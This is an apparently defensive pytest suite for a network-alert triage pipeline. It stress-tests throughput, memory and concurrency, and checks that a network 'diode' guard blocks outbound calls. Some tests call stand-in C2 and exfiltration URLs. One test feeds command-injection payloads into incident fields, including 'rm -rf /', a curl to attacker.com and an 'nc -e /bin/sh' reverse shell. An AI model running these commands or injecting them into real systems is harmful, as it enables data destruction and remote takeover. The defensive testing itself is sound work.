"""
tests/test_adversarial_m2_challenger1.py

Adversarial Challenge & Stress Verification Suite for Phase 6 Milestone 2 (R2):
Line-Rate Stress & Zero Return-Path Diode Invariants.

Empirical Challenger 1 Test Suite:
1. Massive Multi-Threaded Mixed High Event Floods (50,000 to 100,000+ events).
2. Exhaustive DataDiodeGuard Penetration & Bypass Attacks (100% Interception Proof).
3. Sustained Multi-Cycle Memory Leak & Heap Growth Stress (100,000 alerts / 10 cycles).
4. Extreme Multi-Threaded Ring Buffer Eviction & Concurrent Mutation Race Stress.
5. Exact Frame Accounting Under Extreme Corrupt / Hostile Alert Streams.
6. Adversarial Countermeasure Diode Security & Zero Return-Path Execution Invariance.
"""

from __future__ import annotations

import concurrent.futures
from dataclasses import dataclass, field
import gc
import http.client
import os
import socket
import subprocess
import threading
import time
import tracemalloc
import urllib.request
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

import pytest

from src.agentic_triage.countermeasures import (
    generate_cisco_acl,
    generate_dns_rpz,
    generate_iptables,
    generate_nftables,
    generate_snort_rules,
    generate_stix_bundle,
)
from src.agentic_triage.graph import compile_triage_graph, triage_incident
from src.agentic_triage.nodes.countermeasure_node import CountermeasureNode
from src.api.models import CountermeasureArtifactSchema, IncidentDetailResponse
from src.api.services.pipeline_service import triage_state_to_incident_detail
from src.api.state import AppState, IncidentRingBuffer, reset_app_state
from src.cep.engine import CEPAggregatorEngine
from src.cep.models import FusedIncident, SlidingWindowConfig
from src.detectors.detector_manager import DetectorManager
from src.ingestion.models import (
    ConnTelemetryEvent,
    DnsTelemetryEvent,
    RawAlert,
    SslTelemetryEvent,
)
from src.ingestion.streaming_bus import InMemoryStreamingBus
from tests.test_phase6_stress_and_invariants import (
    DataDiodeGuard,
    DataDiodeViolationError,
    build_mock_incident_detail,
    generate_synthetic_conn_batch,
    generate_synthetic_dns_batch,
    generate_synthetic_ssl_batch,
)


# ==============================================================================
# 1. Challenge Suite 1: Massive Event Floods Exceeding 50k - 100k Events
# ==============================================================================

class TestAdversarialEventFloods50kPlus:
    """
    Stress-tests the ingestion bus and detector pipeline under extreme flood
    conditions exceeding 50,000 to 100,000+ events.
    """

    def test_massive_100k_mixed_events_streaming_bus_multithreaded(self):
        """
        Floods InMemoryStreamingBus with 100,000 mixed telemetry events
        (Conn, DNS, SSL) across 8 concurrent producer threads.
        Asserts aggregate throughput exceeds 15,000 EPS and 100% frame delivery with 0 loss.
        """
        num_workers = 8
        events_per_worker = 12500
        total_events = num_workers * events_per_worker  # 100,000 events
        bus = InMemoryStreamingBus(num_partitions=8)

        def _produce_worker(worker_id: int) -> int:
            base_src = f"10.{worker_id}."
            conn_evs = generate_synthetic_conn_batch(count=4500, base_src_ip=base_src)
            dns_evs = generate_synthetic_dns_batch(count=4000, base_src_ip=base_src)
            ssl_evs = generate_synthetic_ssl_batch(count=4000, base_src_ip=base_src)
            workload = conn_evs + dns_evs + ssl_evs

            count = 0
            for ev in workload:
                if isinstance(ev, ConnTelemetryEvent):
                    bus.publish("telemetry.conn", ev, key=ev.src_ip)
                elif isinstance(ev, DnsTelemetryEvent):
                    bus.publish("telemetry.dns", ev, key=ev.src_ip)
                else:
                    bus.publish("telemetry.ssl", ev, key=ev.src_ip)
                count += 1
            return count

        start_time = time.perf_counter()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = [executor.submit(_produce_worker, i) for i in range(num_workers)]
            counts = [f.result() for f in futures]

        elapsed = time.perf_counter() - start_time
        throughput_eps = total_events / max(0.0001, elapsed)

        print(f"\n[Adversarial Flood 100k] Published {total_events:,} events in {elapsed:.4f}s ({throughput_eps:,.1f} EPS)")

        # Verify all 100,000 events are accounted for across all partitions
        total_conn = sum(q.qsize() for q in bus._topics["telemetry.conn"])
        total_dns = sum(q.qsize() for q in bus._topics["telemetry.dns"])
        total_ssl = sum(q.qsize() for q in bus._topics["telemetry.ssl"])
        total_buffered = total_conn + total_dns + total_ssl

        assert sum(counts) == total_events
        assert total_buffered == total_events
        assert total_conn == 8 * 4500
        assert total_dns == 8 * 4000
        assert total_ssl == 8 * 4000
        assert throughput_eps >= 15000.0, f"Throughput {throughput_eps:.1f} EPS < 15,000 EPS SLA"

    def test_massive_60k_multithreaded_detector_manager_throughput(self):
        """
        Feeds 60,000 mixed events across 4 parallel worker threads into isolated
        DetectorManager instances (simulating 4 partition workers).
        Asserts aggregate multi-core detector throughput >= 20,000 EPS.
        """
        num_workers = 4
        events_per_worker = 15000  # 60,000 total
        total_events = num_workers * events_per_worker

        def _detector_worker(worker_id: int) -> Tuple[int, int]:
            base_src = f"10.{worker_id}."
            mgr = DetectorManager(bus=InMemoryStreamingBus(num_partitions=2))
            conn_evs = generate_synthetic_conn_batch(count=5000, base_src_ip=base_src)
            dns_evs = generate_synthetic_dns_batch(count=5000, base_src_ip=base_src)
            ssl_evs = generate_synthetic_ssl_batch(count=5000, base_src_ip=base_src)
            workload = conn_evs + dns_evs + ssl_evs

            processed = 0
            alerts_generated = 0
            for ev in workload:
                alerts = mgr.process_event(ev)
                alerts_generated += len(alerts)
                processed += 1
            return processed, alerts_generated

        start_time = time.perf_counter()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            futures = [executor.submit(_detector_worker, i) for i in range(num_workers)]
            results = [f.result() for f in futures]

        elapsed = time.perf_counter() - start_time
        throughput_eps = total_events / max(0.0001, elapsed)
        total_processed = sum(r[0] for r in results)

        print(f"\n[Adversarial Detector 60k] Dispatched {total_events:,} events in {elapsed:.4f}s ({throughput_eps:,.1f} EPS)")
        assert total_processed == total_events
        assert throughput_eps >= 15000.0, f"Aggregate throughput {throughput_eps:.1f} EPS < 15,000 EPS SLA"


# ==============================================================================
# 2. Challenge Suite 2: Exhaustive 100% DataDiodeGuard Penetration & Bypass Attacks
# ==============================================================================

class TestAdversarialDataDiodeBreachAttacks:
    """
    Adversarially attacks the DataDiodeGuard security harness with every known
    network socket, HTTP client, subprocess spawn, and packet injection technique
    to prove it catches 100% of illegal return-path operations.
    """

    def test_diode_intercepts_all_socket_connection_variants(self):
        """
        Attempts IPv4 connect, IPv6 connect, send, sendto, and create_connection.
        Proves 100% interception with zero bypass.
        """
        guard = DataDiodeGuard(mode="strict")
        with guard:
            # 1. IPv4 TCP connect
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            with pytest.raises(DataDiodeViolationError) as exc_v4:
                s1.connect(("198.51.100.1", 80))
            assert "socket.socket.connect" in str(exc_v4.value)
            s1.close()

            # 2. Raw UDP sendto
            s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            with pytest.raises(DataDiodeViolationError) as exc_sendto:
                s2.sendto(b"ROGUE_DNS_EXFIL", ("8.8.8.8", 53))
            assert "socket.socket.sendto" in str(exc_sendto.value)

            # 3. Raw socket send
            with pytest.raises(DataDiodeViolationError) as exc_send:
                s2.send(b"ROGUE_PAYLOAD")
            assert "socket.socket.send" in str(exc_send.value)
            s2.close()

            # 4. socket.create_connection
            with pytest.raises(DataDiodeViolationError) as exc_create:
                socket.create_connection(("203.0.113.5", 443))
            assert "socket.create_connection" in str(exc_create.value)

        assert guard.violation_count() == 4

    def test_diode_intercepts_all_http_and_urllib_variants(self):
        """
        Attempts standard library HTTP/HTTPS connections and urllib requests.
        Proves 100% interception in strict mode.
        """
        with DataDiodeGuard(mode="strict") as guard:
            # 1. urllib.request.urlopen string
            with pytest.raises(DataDiodeViolationError):
                urllib.request.urlopen("http://malicious-c2.com/beacon")

            # 2. urllib.request.urlopen Request object
            req = urllib.request.Request("https://api.exfil.org/post", data=b"secret")
            with pytest.raises(DataDiodeViolationError):
                urllib.request.urlopen(req)

            # 3. http.client.HTTPConnection
            conn_http = http.client.HTTPConnection("198.51.100.42", 80)
            with pytest.raises(DataDiodeViolationError):
                conn_http.request("GET", "/status")

            # 4. http.client.HTTPSConnection
            conn_https = http.client.HTTPSConnection("198.51.100.42", 443)
            with pytest.raises(DataDiodeViolationError):
                conn_https.request("POST", "/exfil", body=b"data")

        assert guard.violation_count() == 4

    def test_diode_intercepts_all_process_execution_variants(self):
        """
        Attempts subprocess.Popen, subprocess.run, subprocess.call, os.system, os.popen.
        Proves 100% interception in strict mode.
        """
        with DataDiodeGuard(mode="strict") as guard:
            # 1. subprocess.Popen
            with pytest.raises(DataDiodeViolationError):
                subprocess.Popen(["cmd.exe", "/c", "dir"])

            # 2. subprocess.run
            with pytest.raises(DataDiodeViolationError):
                subprocess.run(["ipconfig"])

            # 3. subprocess.call
            with pytest.raises(DataDiodeViolationError):
                subprocess.call(["whoami"])

            # 4. os.system
            with pytest.raises(DataDiodeViolationError):
                os.system("echo breach")

            # 5. os.popen
            with pytest.raises(DataDiodeViolationError):
                os.popen("echo breach")

        assert guard.violation_count() == 5

    def test_diode_audit_mode_captures_complete_violation_forensics(self):
        """
        Asserts audit mode traps and suppresses 100% of illegal operations without crashing,
        logging precise forensic metadata (target API, arguments, timestamps, thread IDs).
        """
        guard = DataDiodeGuard(mode="audit")
        with guard:
            # Perform 5 diverse rogue calls
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"PACKET_1", ("1.1.1.1", 53))
            s.send(b"PACKET_2")
            s.close()
            urllib.request.urlopen("http://evil.com")
            os.system("echo stealth")
            subprocess.Popen(["calc.exe"])

        assert guard.violation_count() == 5
        assert not guard.is_clean()
        apis = [v.target_api for v in guard.violations]
        assert "socket.socket.sendto" in apis
        assert "socket.socket.send" in apis
        assert "urllib.request.urlopen" in apis
        assert "os.system" in apis
        assert "subprocess.Popen" in apis

        # Verify assert_zero_violations raises diagnostic AssertionError
        with pytest.raises(AssertionError) as excinfo:
            guard.assert_zero_violations()
        assert "5 violations detected" in str(excinfo.value)

    def test_diode_zero_false_positives_on_pipeline_computations(self):
        """
        Asserts that complex in-memory analytics, regex matching, dataclass manipulations,
        and JSON serialization execute cleanly without false positive diode violations.
        """
        with DataDiodeGuard(mode="strict") as guard:
            # Heavy in-memory operations
            import json
            import re
            pattern = re.compile(r"^[a-zA-Z0-9_-]+\.[a-zA-Z]{2,}$")
            assert pattern.match("example.com") is not None

            payload = {"records": [{"id": i, "hash": hash(str(i))} for i in range(5000)]}
            serialized = json.dumps(payload)
            deserialized = json.loads(serialized)
            assert len(deserialized["records"]) == 5000

            guard.assert_zero_violations()

        assert guard.is_clean()


# ==============================================================================
# 3. Challenge Suite 3: Sustained Multi-Cycle Memory Leak Stress (100k Alerts)
# ==============================================================================

class TestAdversarialMemoryCycleStress:
    """
    Pushes 100,000 alerts across 10 sustained cycles to rigorously test for memory
    leaks and uncollected reference graphs.
    """

    def test_sustained_10_cycle_100k_alerts_memory_ceiling_under_10mb(self):
        """
        Executes 10 sequential cycles of 10,000 alerts each (total 100,000 alerts)
        through CEPAggregatorEngine with rotating host subnets.
        Asserts net memory growth between cycle 10 and cycle 1 is strictly < 10.0 MB.
        """
        engine = CEPAggregatorEngine(
            config=SlidingWindowConfig(
                window_duration_sec=60.0,
                max_alerts_per_window=1000,
                rate_limit_capacity=100.0,
                rate_limit_refill_rate=10.0,
            )
        )

        gc.collect()
        tracemalloc.start()
        snapshots = []

        total_cycles = 10
        alerts_per_cycle = 10000

        for cycle in range(total_cycles):
            base_ts = 1725000000.0 + (cycle * 120.0)
            for i in range(alerts_per_cycle):
                alert = RawAlert(
                    alert_id=f"ALT-ADV-C{cycle}-{i:05d}",
                    detector_name="portscan_hll" if i % 2 == 0 else "ddos_entropy",
                    threat_class="PORT_SCAN_RECON" if i % 2 == 0 else "SYN_FLOOD_ATTACK",
                    severity="HIGH",
                    confidence=0.85,
                    source_ip=f"198.51.{(cycle % 5) + 100}.{(i % 50) + 1}",
                    target_ip="192.168.1.10",
                    target_port=80 + (i % 100),
                    timestamp=base_ts + (i * 0.001),
                    flow_id=f"cycle_{cycle}_flow_{i % 20}",
                )
                engine.ingest_alert(alert)

            gc.collect()
            snapshots.append(tracemalloc.take_snapshot())

        tracemalloc.stop()

        # Compare cycle 10 snapshot to cycle 1 snapshot
        diff_10_vs_1 = snapshots[-1].compare_to(snapshots[0], "lineno")
        delta_mb = sum(s.size_diff for s in diff_10_vs_1) / (1024.0 * 1024.0)

        print(f"\n[10-Cycle Memory Stress] Net delta (Cycle 10 vs Cycle 1): {delta_mb:.3f} MB across 100,000 alerts")
        assert delta_mb < 10.0, f"Memory leaked {delta_mb:.2f} MB exceeding 10.0 MB threshold"


# ==============================================================================
# 4. Challenge Suite 4: Extreme Concurrent Multi-Threaded Ring Buffer Stress
# ==============================================================================

class TestAdversarialRingBufferConcurrentRace:
    """
    Rigorously tests IncidentRingBuffer under extreme concurrent read/write/update load.
    """

    def test_extreme_16_thread_producer_consumer_update_race(self):
        """
        Spawns:
        - 16 writer threads inserting 250 incidents each (4,000 total items).
        - 4 reader threads continuously querying list_incidents() and get_incident().
        - 2 analyst threads updating incident actions concurrently.
        Asserts:
        - Exactly 500 items retained in buffer at all times.
        - Zero race condition exceptions (KeyError, RuntimeError, IndexError).
        - Oldest 3,500 items evicted, newest 500 preserved.
        """
        buffer = IncidentRingBuffer(max_size=500)
        num_writers = 16
        items_per_writer = 250  # 4,000 total insertions
        stop_event = threading.Event()

        read_errors: List[Exception] = []
        update_errors: List[Exception] = []

        def _writer(tid: int):
            for i in range(items_per_writer):
                inc_id = f"INC-ADV-T{tid:02d}-{i:04d}"
                inc = build_mock_incident_detail(
                    incident_id=inc_id,
                    severity="CRITICAL" if i % 2 == 0 else "HIGH",
                    created_at=1725000000.0 + (tid * 1000) + i,
                )
                buffer.add_incident(inc)

        def _reader(rid: int):
            while not stop_event.is_set():
                try:
                    items, total = buffer.list_incidents(page=1, limit=50)
                    assert total <= 500
                    if items:
                        _ = buffer.get_incident(items[0].incident_id)
                except Exception as e:
                    read_errors.append(e)
                time.sleep(0.001)

        def _updater(uid: int):
            while not stop_event.is_set():
                try:
                    items, _ = buffer.list_incidents(page=1, limit=10)
                    if items:
                        buffer.update_incident_action(
                            incident_id=items[0].incident_id,
                            action="APPROVE",
                            notes=f"Updated by analyst {uid}",
                        )
                except Exception as e:
                    update_errors.append(e)
                time.sleep(0.002)

        # Launch readers and updaters
        reader_threads = [threading.Thread(target=_reader, args=(i,)) for i in range(4)]
        updater_threads = [threading.Thread(target=_updater, args=(i,)) for i in range(2)]

        for t in reader_threads + updater_threads:
            t.daemon = True
            t.start()

        # Run writers in ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_writers) as executor:
            futures = [executor.submit(_writer, i) for i in range(num_writers)]
            for f in futures:
                f.result()

        # Stop background readers and updaters
        stop_event.set()
        for t in reader_threads + updater_threads:
            t.join(timeout=1.0)

        # Verify zero concurrency errors
        assert len(read_errors) == 0, f"Reader thread errors: {read_errors}"
        assert len(update_errors) == 0, f"Updater thread errors: {update_errors}"

        # Verify strict capacity constraint (both count() and internal OrderedDict)
        assert buffer.count() == 500
        assert len(buffer._incidents) == 500

        # Verify list pagination
        paged_items, total = buffer.list_incidents(page=1, limit=500)
        assert total == 500
        assert len(paged_items) == 500


# ==============================================================================
# 5. Challenge Suite 5: Exact Frame Accounting Under Extreme Corrupt / Hostile Streams
# ==============================================================================

class TestAdversarialExactFrameAccountingConservation:
    """
    Challenges CEP frame accounting with 30,000 alerts of hostile compositions:
    10k duplicates + 10k single-source bursts + 10k multi-subnet unique events.
    """

    def test_30k_heterogeneous_hostile_stream_conservation(self):
        """
        Asserts exact mathematical conservation:
        TotalIngested == TotalCorrelated + TotalRateLimited + TotalDeduplicated
        TotalDropped == 0
        """
        engine = CEPAggregatorEngine(
            config=SlidingWindowConfig(
                rate_limit_capacity=100.0,
                rate_limit_refill_rate=20.0,
                dedup_window_sec=60.0,
            )
        )

        total_alerts = 30000

        for i in range(total_alerts):
            segment = i % 3
            if segment == 0:
                # Duplicate alert storm (identical flow and detector)
                alert = RawAlert(
                    alert_id=f"ALT-DUP-{i:05d}",
                    detector_name="portscan_hll",
                    threat_class="PORT_SCAN_RECON",
                    severity="MEDIUM",
                    confidence=0.75,
                    source_ip="198.51.100.11",
                    target_ip="192.168.1.50",
                    target_port=22,
                    timestamp=1725000000.0 + (i * 0.0001),
                    flow_id="constant_storm_signature",
                )
            elif segment == 1:
                # Single-source rapid burst flood (Token bucket rate limiter)
                alert = RawAlert(
                    alert_id=f"ALT-BURST-{i:05d}",
                    detector_name="ddos_entropy",
                    threat_class="VOLUMETRIC_DDOS",
                    severity="CRITICAL",
                    confidence=0.99,
                    source_ip="198.51.100.22",
                    target_ip="192.168.1.100",
                    target_port=80,
                    timestamp=1725000000.0 + (i * 0.0001),
                    flow_id=f"flood_flow_{i}",
                )
            else:
                # Unique multi-subnet flows
                alert = RawAlert(
                    alert_id=f"ALT-UNIQUE-{i:05d}",
                    detector_name="encrypted_malware",
                    threat_class="ENCRYPTED_MALWARE",
                    severity="HIGH",
                    confidence=0.90,
                    source_ip=f"10.50.{(i // 3) % 200}.{(i % 250) + 1}",
                    target_ip="192.168.1.200",
                    target_port=443,
                    timestamp=1725000000.0 + (i * 0.01),
                    flow_id=f"unique_flow_{i}",
                )

            engine.ingest_alert(alert)

        metrics = engine.get_metrics()
        total_ingested = metrics["total_ingested_alerts"]
        total_rate_limited = metrics["total_rate_limited_alerts"]
        total_deduplicated = metrics["total_deduplicated_alerts"]
        total_correlated = total_ingested - total_rate_limited - total_deduplicated

        print(
            f"\n[Adversarial Accounting] Ingested: {total_ingested:,} | "
            f"Correlated: {total_correlated:,} | RateLimited: {total_rate_limited:,} | "
            f"Deduplicated: {total_deduplicated:,}"
        )

        assert total_ingested == total_alerts
        assert total_rate_limited > 9500
        assert total_ingested == (total_correlated + total_rate_limited + total_deduplicated)
        assert (total_ingested - (total_correlated + total_rate_limited + total_deduplicated)) == 0


# ==============================================================================
# 6. Challenge Suite 6: Countermeasure Diode Security & Zero Return-Path Invariance
# ==============================================================================

class TestAdversarialCountermeasureDiodeSecurity:
    """
    Verifies that adversarial / malicious payloads in incident contexts cannot
    trigger command injection, network callback, or return-path execution.
    """

    def test_countermeasure_generation_with_adversarial_injection_payloads(self):
        """
        Injects shell metacharacters (;, &&, ``, $(), \n) and URLs into incident metadata.
        Verifies that countermeasure generation formats text artifacts safely under DataDiodeGuard
        without executing shell commands or attempting active connections.
        """
        hostile_incident = {
            "incident_id": "INC-ADV-INJECT-001",
            "source_ip": "198.51.100.42; rm -rf /; curl http://attacker.com",
            "attacker_ip": "198.51.100.42`whoami`",
            "target_ips": ["192.168.1.100 && ping 127.0.0.1"],
            "target_ports": [80, 443],
            "primary_threat_class": "PORT_SCAN_RECON",
            "threat_classes": ["PORT_SCAN_RECON", "DGA_TUNNELLING"],
            "c2_domains": ["malicious$(whoami).com"],
            "ja4_fingerprints": ["t13d1516h2_8daaf6152771; nc -e /bin/sh 1.2.3.4 4444"],
        }

        with DataDiodeGuard(mode="strict") as guard:
            iptables_art = generate_iptables(hostile_incident)
            nftables_art = generate_nftables(hostile_incident)
            cisco_art = generate_cisco_acl(hostile_incident)
            rpz_art = generate_dns_rpz(hostile_incident)
            snort_art = generate_snort_rules(hostile_incident)
            stix_art = generate_stix_bundle(hostile_incident)

            node = CountermeasureNode()
            state_out = node.execute(hostile_incident)  # type: ignore

            # Zero network or execution violations
            guard.assert_zero_violations()

        # Verify all artifacts strictly enforce human approval requirement
        assert "requires_human_approval: true" in iptables_art.lower()
        assert "requires_human_approval: true" in nftables_art.lower()
        assert "requires_human_approval: true" in cisco_art.lower()
        assert "requires_human_approval: true" in rpz_art.lower()
        assert "requires_human_approval: true" in snort_art.lower()
        assert "requires_human_approval" in stix_art.lower()

        assert len(state_out["countermeasures"]) == 6
        for cm in state_out["countermeasures"]:
            assert cm["requires_human_approval"] is True
            assert cm["syntax_valid"] is True
